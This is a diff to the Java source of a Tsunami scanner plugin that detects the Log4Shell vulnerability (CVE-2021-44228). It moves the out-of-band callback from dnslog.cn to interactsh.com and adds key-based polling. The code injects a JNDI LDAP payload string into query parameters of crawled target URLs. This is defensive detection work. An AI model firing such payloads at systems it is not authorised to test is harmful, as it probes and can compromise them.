@@ -17,8 +17,6 @@ package com.google.tsunami.plugins.detectors.cves.cve202144228;
 
 import static com.google.common.base.Preconditions.checkNotNull;
 import static com.google.common.collect.ImmutableList.toImmutableList;
-import static com.google.common.net.HttpHeaders.COOKIE;
-import static com.google.common.net.HttpHeaders.SET_COOKIE;
 import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
 import static java.nio.charset.StandardCharsets.UTF_8;
 
@@ -26,11 +24,11 @@ import com.google.common.annotations.VisibleForTesting;
 import com.google.common.collect.ImmutableList;
 import com.google.common.collect.ImmutableSet;
 import com.google.common.flogger.GoogleLogger;
+import com.google.gson.Gson;
 import com.google.protobuf.ByteString;
 import com.google.protobuf.util.Timestamps;
 import com.google.tsunami.common.data.NetworkServiceUtils;
 import com.google.tsunami.common.net.http.HttpClient;
-import com.google.tsunami.common.net.http.HttpHeaders;
 import com.google.tsunami.common.net.http.HttpRequest;
 import com.google.tsunami.common.net.http.HttpResponse;
 import com.google.tsunami.common.net.http.HttpStatus;
@@ -50,16 +48,37 @@ import com.google.tsunami.proto.Severity;
 import com.google.tsunami.proto.TargetInfo;
 import com.google.tsunami.proto.Vulnerability;
 import com.google.tsunami.proto.VulnerabilityId;
+import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.OutputStreamWriter;
 import java.io.UnsupportedEncodingException;
 import java.net.URLEncoder;
+import java.security.KeyPair;
+import java.security.KeyPairGenerator;
+import java.security.NoSuchAlgorithmException;
+import java.security.PrivateKey;
+import java.security.PublicKey;
+import java.security.spec.MGF1ParameterSpec;
 import java.time.Clock;
 import java.time.Instant;
 import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.Base64;
 import java.util.HashMap;
 import java.util.List;
+import java.util.Locale;
 import java.util.Map;
+import java.util.Random;
+import java.util.UUID;
+import javax.crypto.Cipher;
+import javax.crypto.SecretKey;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.OAEPParameterSpec;
+import javax.crypto.spec.PSource;
+import javax.crypto.spec.SecretKeySpec;
 import javax.inject.Inject;
+import org.bouncycastle.util.io.pem.PemObject;
+import org.bouncycastle.util.io.pem.PemWriter;
 
 /**
  * A {@link VulnDetector} that detects the CVE-2021-44228 vulnerability.
@@ -79,10 +98,9 @@ import javax.inject.Inject;
 public final class Cve202144228VulnDetector implements VulnDetector {
 
   public static String OOB_DOMAIN = "";
+  private PrivateKey privateKey;
   private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
-  private static int MAX_TRY_GET_OOB_DOMAIN = 6;
-  private static String PHP_SESSION = "";
-  private static String PAYLOAD = "${jndi:ldap://tsunami.OOB_DOMAIN/}";
+  private static String PAYLOAD = "${jndi:ldap://OOB_DOMAIN/}";
 
   @VisibleForTesting
   static final String VULN_DESCRIPTION =
@@ -95,12 +113,17 @@ public final class Cve202144228VulnDetector implements VulnDetector {
   private final HttpClient httpClient;
   private final Clock utcClock;
   private final Crawler crawler;
+  private final UUID secretKey;
+  private final String correlationId;
+
 
   @Inject
   Cve202144228VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient, Crawler crawler) {
     this.httpClient = checkNotNull(httpClient);
     this.utcClock = checkNotNull(utcClock);
     this.crawler = checkNotNull(crawler);
+    this.secretKey = UUID.randomUUID();
+    this.correlationId = getRandomString(20);
   }
 
   @Override
@@ -197,24 +220,31 @@ public final class Cve202144228VulnDetector implements VulnDetector {
   }
 
   public void initOOBDomain() {
-    try {
-      if ("".equals(OOB_DOMAIN)) {
+    if ("".equals(OOB_DOMAIN)) {
+      try {
+        KeyPair keyPair = generateRsaKeyPair();
+        privateKey = keyPair.getPrivate();
+        PublicKey publicKey = keyPair.getPublic();
+        PemObject pemObject = new PemObject("PUBLIC KEY", publicKey.getEncoded());
+        ByteArrayOutputStream pubKeyByteStream = new ByteArrayOutputStream();
+        PemWriter pemWriter = new PemWriter(new OutputStreamWriter(pubKeyByteStream));
+        pemWriter.writeObject(pemObject);
+        pemWriter.close();
+        String pubKeyEncoded =
+            new String(Base64.getEncoder().encode(pubKeyByteStream.toByteArray()));
+
+        String registerData = String
+            .format("{\"public-key\":\"%s\",\"secret-key\":\"%s\",\"correlation-id\":\"%s\"}",
+                pubKeyEncoded, this.secretKey, this.correlationId);
         HttpResponse response = httpClient
-            .send(HttpRequest.get("http://www.dnslog.cn/getdomain.php").withEmptyHeaders().build());
-        if (HttpStatus.OK.equals(response.status())) {
-          OOB_DOMAIN = response.bodyString().get();
-          PAYLOAD = PAYLOAD.replace("OOB_DOMAIN", OOB_DOMAIN);
-          PHP_SESSION = response.headers().get(SET_COOKIE).get().replace("path=/", "");
-          logger.atInfo().log("Request oob domain %s success", OOB_DOMAIN);
+            .send(HttpRequest.post("https://interactsh.com/register").setRequestBody(
+                ByteString.copyFromUtf8(registerData)).withEmptyHeaders().build());
+        if (response.bodyString().get().contains("successful")) {
+          OOB_DOMAIN = "tsunami." + correlationId + "gdpdpreyyyyyb.interactsh.com";
+          logger.atInfo().log("Register interactsh oob domain %s success", OOB_DOMAIN);
         }
-      }
-    } catch (IOException e) {
-      if (e.getMessage().contains("timeout") && MAX_TRY_GET_OOB_DOMAIN > 0) {
-        logger.atWarning().log("Request to oob domain timeout,retrying...");
-        MAX_TRY_GET_OOB_DOMAIN = MAX_TRY_GET_OOB_DOMAIN - 1;
-        initOOBDomain();
-      } else {
-        logger.atWarning().withCause(e).log("Request to oob domain failed");
+      } catch (Exception e) {
+        logger.atWarning().withCause(e).log("Register interactsh oob domain failed");
       }
     }
   }
@@ -226,24 +256,20 @@ public final class Cve202144228VulnDetector implements VulnDetector {
    */
   private boolean checkOOBData() {
     try {
-      MAX_TRY_GET_OOB_DOMAIN = 3;
-      Thread.sleep(10000);
-      // dnslog is not stable
-      HttpResponse response = httpClient
-          .send(HttpRequest.get("http://www.dnslog.cn/getrecords.php").setHeaders(
-              HttpHeaders.builder().addHeader(COOKIE, PHP_SESSION).build()).build());
-      if (HttpStatus.OK.equals(response.status()) && response.bodyString().get()
-          .contains("tsunami")) {
-        return true;
+      String poolUrl = String
+          .format("https://interactsh.com/poll?id=%s&secret=%s", correlationId, secretKey);
+      HttpResponse response = httpClient.send(HttpRequest.get(poolUrl).withEmptyHeaders().build());
+      if (response.status() == HttpStatus.OK && response.bodyString().get().contains("aes_key")) {
+        PollData pollData = new Gson().fromJson(response.bodyString().get(), PollData.class);
+        for (String datum : pollData.getData()) {
+          String decryptMessage = new String(decryptMessage(pollData.getAes_key(), datum));
+          if (decryptMessage.contains("tsunami")) {
+            return true;
+          }
+        }
       }
-    } catch (Exception e) {
-      if (e.getMessage().contains("timeout") && MAX_TRY_GET_OOB_DOMAIN > 0) {
-        logger.atWarning().log("Check oob domain result timeout,retrying...");
-        MAX_TRY_GET_OOB_DOMAIN = MAX_TRY_GET_OOB_DOMAIN - 1;
-        checkOOBData();
-      } else {
-        logger.atWarning().withCause(e).log("Check oob domain result failed");
-      }
+    } catch (IOException e) {
+      logger.atWarning().withCause(e).log("Check oob data failed");
     }
     return false;
   }
@@ -297,7 +323,7 @@ public final class Cve202144228VulnDetector implements VulnDetector {
         if (queryString.contains("=") && queryString.split("=").length == 2) {
           String queryStringKey = queryString.split("=")[0];
           String newQueryString = queryStringKey + "=" +
-              URLEncoder.encode(PAYLOAD, UTF_8.toString());
+              URLEncoder.encode(PAYLOAD.replace("OOB_DOMAIN", OOB_DOMAIN), UTF_8.toString());
           String uri = query.replace(queryString, newQueryString);
           nextUriList.add(uri);
         }
@@ -371,4 +397,81 @@ public final class Cve202144228VulnDetector implements VulnDetector {
             .build();
     return crawler.crawl(crawlConfig);
   }
+
+  private static KeyPair generateRsaKeyPair() throws NoSuchAlgorithmException {
+    KeyPairGenerator generator = KeyPairGenerator.getInstance("RSA");
+    generator.initialize(2048);
+
+    KeyPair keyPair = generator.generateKeyPair();
+    logger.atInfo().log("Interactsh: RSA key pair generated.");
+    return keyPair;
+  }
+
+  private byte[] decryptMessage(String encodedEncryptedKey, String encodedEncryptedMsg) {
+    try {
+      byte[] decodedEncryptedKey = Base64.getDecoder().decode(encodedEncryptedKey);
+      Cipher decryptionCipher = Cipher.getInstance("RSA/ECB/OAEPWITHSHA-256ANDMGF1PADDING");
+      OAEPParameterSpec oaepParameterSpec =
+          new OAEPParameterSpec(
+              "SHA-256",
+              "MGF1",
+              MGF1ParameterSpec.SHA256,
+              PSource.PSpecified.DEFAULT);
+      decryptionCipher.init(Cipher.DECRYPT_MODE, this.privateKey, oaepParameterSpec);
+      byte[] decodedDecryptedKey = decryptionCipher.doFinal(decodedEncryptedKey);
+
+      byte[] decodedEncryptedMsg = Base64.getDecoder().decode(encodedEncryptedMsg);
+      decryptionCipher = Cipher.getInstance("AES/CFB/NoPadding");
+      SecretKey aesKey = new SecretKeySpec(decodedDecryptedKey, "AES");
+      IvParameterSpec iv =
+          new IvParameterSpec(
+              Arrays.copyOf(decodedEncryptedMsg, decryptionCipher.getBlockSize()));
+      decryptionCipher.init(Cipher.DECRYPT_MODE, aesKey, iv);
+      return decryptionCipher.doFinal(
+          Arrays.copyOfRange(
+              decodedEncryptedMsg,
+              decryptionCipher.getBlockSize(),
+              decodedEncryptedMsg.length));
+    } catch (Exception e) {
+      logger.atWarning().withCause(e).log("Could not decrypt Interactsh interactions");
+      return new byte[0];
+    }
+  }
+
+  public static String getRandomString(int length) {
+    String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    Random random = new Random();
+    StringBuffer sb = new StringBuffer();
+    for (int i = 0; i < length; i++) {
+      int number = random.nextInt(62);
+      sb.append(str.charAt(number));
+    }
+    return sb.toString().toLowerCase(Locale.ROOT);
+  }
+
+  class PollData {
+
+    private String[] data;
+    private String aes_key;
+
+    public String[] getData() {
+      return data;
+    }
+
+    public void setData(String[] data) {
+      this.data = data;
+    }
+
+    public String getAes_key() {
+      return aes_key;
+    }
+
+    public void setAes_key(String aes_key) {
+      this.aes_key = aes_key;
+    }
+
+
+  }
+
+
 }
